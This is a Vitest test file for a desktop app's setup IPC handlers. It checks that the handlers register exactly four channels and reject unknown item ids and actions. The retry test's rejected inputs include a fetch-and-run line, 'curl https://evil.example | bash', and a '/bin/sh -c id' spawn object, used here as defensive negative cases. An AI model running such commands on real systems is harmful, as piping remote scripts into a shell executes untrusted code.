import { describe, expect, it, vi } from "vitest";
import { IPC_COMMANDS } from "../../shared/ipc-types";
import type { SetupState } from "../../shared/setup";
import { type IpcCaller, IpcRegistry } from "../web/ipc-registry";
import { registerSetupIpc } from "./ipc";

const STATE: SetupState = { platform: "darwin", automatic: true, ompReady: true, requiredRunning: false, items: [] };
const CALLER: IpcCaller = { win: null, browserWindow: null, sender: { id: 1, once: () => {} } };

function registered() {
	const channels: string[] = [];
	const ipc = new IpcRegistry({ handle: channel => channels.push(channel), on: () => {} });
	const service = {
		state: vi.fn(() => STATE),
		retry: vi.fn(async (_item: unknown) => {}),
		cancel: vi.fn(() => true),
		gitAslr: vi.fn(async () => ({ ok: true as const, images: 3 })),
	};
	registerSetupIpc(ipc, service);
	const call = (channel: string, ...args: unknown[]) => ipc.invoke(channel, CALLER, args);
	return { service, call, channels };
}

describe("setup IPC", () => {
	it("serves exactly the state, retry, cancel and Git ASLR channels", async () => {
		const { channels, call, service } = registered();
		expect(channels.sort()).toEqual(
			[
				IPC_COMMANDS.SETUP_CANCEL,
				IPC_COMMANDS.SETUP_GET_STATE,
				IPC_COMMANDS.SETUP_GIT_ASLR,
				IPC_COMMANDS.SETUP_RETRY,
			].sort(),
		);
		expect(await call(IPC_COMMANDS.SETUP_GET_STATE)).toBe(STATE);
		expect(await call(IPC_COMMANDS.SETUP_CANCEL)).toBe(true);
		expect(service.cancel).toHaveBeenCalledTimes(1);
	});

	it("retries a known item id", async () => {
		const { call, service } = registered();
		await call(IPC_COMMANDS.SETUP_RETRY, "omp");
		expect(service.retry).toHaveBeenCalledWith("omp");
	});

	it("refuses anything that is not a known item id, before the service sees it", async () => {
		const { call, service } = registered();
		for (const value of [
			"bun-install",
			"curl https://evil.example | bash",
			{ file: "/bin/sh", args: ["-c", "id"] },
			["omp"],
			undefined,
			null,
			42,
		]) {
			await expect(call(IPC_COMMANDS.SETUP_RETRY, value)).rejects.toThrow(/Unknown setup item/);
		}
		expect(service.retry).not.toHaveBeenCalled();
	});

	it("passes only fix or undo to the Git ASLR step", async () => {
		const { call, service } = registered();
		expect(await call(IPC_COMMANDS.SETUP_GIT_ASLR, "undo")).toEqual({ ok: true, images: 3 });
		for (const value of ["Fix", "system", { action: "fix" }, undefined]) {
			await expect(call(IPC_COMMANDS.SETUP_GIT_ASLR, value)).rejects.toThrow(/Unknown Git ASLR action/);
		}
		expect(service.gitAslr.mock.calls).toEqual([["undo"]]);
	});
});
